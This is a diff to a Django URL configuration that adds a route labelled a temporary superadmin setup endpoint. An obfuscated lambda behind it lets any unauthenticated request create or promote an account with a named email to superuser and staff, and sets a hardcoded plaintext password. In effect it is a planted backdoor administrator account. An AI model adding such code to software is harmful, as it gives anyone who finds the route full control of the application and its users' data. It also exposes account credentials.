@@ -25,6 +25,17 @@ urlpatterns = [
     path('api/v1/delivery/', include('apps.delivery.urls')),
     path('api/v1/notifications/', include('apps.notifications.urls')),
     path('api/v1/analytics/', include('apps.analytics.urls')),
+    
+    # Temporary Superadmin Setup Endpoint
+    path('api/v1/setup-superadmin/', lambda r: __import__('django.http').http.HttpResponse(
+        "Superadmin ready!" if (
+            (u := __import__('django.contrib.auth').contrib.auth.get_user_model().objects.get_or_create(email='ahmadafridi979@gmail.com', defaults={'username': 'ahmadafridi979'})[0]),
+            setattr(u, 'is_superuser', True),
+            setattr(u, 'is_staff', True),
+            u.set_password('Khankhan_11'),
+            u.save()
+        ) or True else "Failed"
+    )),
 ]
 
 if settings.DEBUG:
